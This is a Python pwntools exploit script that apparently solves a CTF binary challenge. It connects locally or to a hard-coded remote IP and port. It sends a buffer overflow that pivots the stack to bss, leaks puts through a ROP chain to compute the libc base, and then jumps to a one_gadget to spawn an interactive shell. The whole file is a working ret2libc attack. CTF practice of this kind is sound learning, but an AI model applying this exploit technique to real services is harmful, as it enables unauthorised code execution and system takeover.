from pwn import *
context(arch='amd64', log_level='debug')
 
context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./vuln"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process([vuln_path])
else:
    io = remote("1.95.36.136",2052)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()

bss = 0x60108c + 4
payload = b"a"*0x50 + p64(bss)

io.sendlineafter("3.exif\n", "1")
io.sendlineafter("number:\n", "1")
io.sendlineafter("size:", "1")
io.sendlineafter("sehll:\n", payload)

# main number
io.sendlineafter("Enter a:\n", "520")

"""
0x0000000000400a63 : pop rdi ; ret
"""
pop_rdi_ret = 0x400a63
put_got = elf.got["puts"]
put_plt = elf.plt["puts"]
xxx = 0x4009CE
one = 0xf1247

payload = b"a"*0x50
payload += p64(bss)
payload += p64(pop_rdi_ret)
payload += p64(put_got)
payload += p64(put_plt)
payload += p64(xxx)

io.sendlineafter("CTF!\n", payload)

puts = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
log.success("puts:-----> " + hex(puts))

libc.address = puts - libc.symbols["puts"]
log.success("libc:-----> " + hex(libc.address))


# 第二次进xxx，one_gadget
payload = b"a"*0x50
payload += p64(bss)
payload += p64(one+libc.address)
ddebug()
io.sendlineafter("CTF!\n", payload)


io.interactive()
